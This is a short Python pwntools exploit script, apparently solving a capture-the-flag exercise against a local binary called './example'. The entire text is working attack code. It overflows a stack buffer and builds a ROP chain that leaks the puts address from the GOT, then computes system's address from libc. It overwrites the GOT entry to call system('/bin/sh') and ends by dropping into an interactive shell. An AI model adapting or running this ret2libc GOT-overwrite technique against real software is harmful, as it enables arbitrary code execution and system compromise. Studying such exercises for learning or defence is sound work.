from pwn import *
context.log_level = "debug"
pop_rdi = 0x4006b3

e = ELF("./example")
puts_got = e.got["puts"]
puts_plt = e.plt["puts"]
gets_plt = e.plt["gets"]

# puts(put_got)  =>  puts_addr => system_addr 
# gets(puts_got) =>  overwrite puts got to system_addr 
# /bin/sh => puts_got +8    p64(system_addr)+"/bin/sh\x00"
payload = "A"*216+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)
payload += p64(pop_rdi)+p64(puts_got)+p64(gets_plt)
payload += p64(pop_rdi)+p64(puts_got+8)+p64(puts_plt)

p = process("./example")
p.recvuntil(":\n") 
p.sendline(payload)
p.recvuntil("challenge\n")
puts_addr = u64(p.recvuntil("\n")[:-1].ljust(8,"\x00"))
print hex(puts_addr)

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6") 
sys_off = libc.symbols["system"]
puts_off =  libc.symbols["puts"]

sys_addr = puts_addr - puts_off + sys_off
print "system: "+hex(sys_addr)

p2 = p64(sys_addr)+"/bin/sh\x00"
p.sendline(p2)

p.interactive()
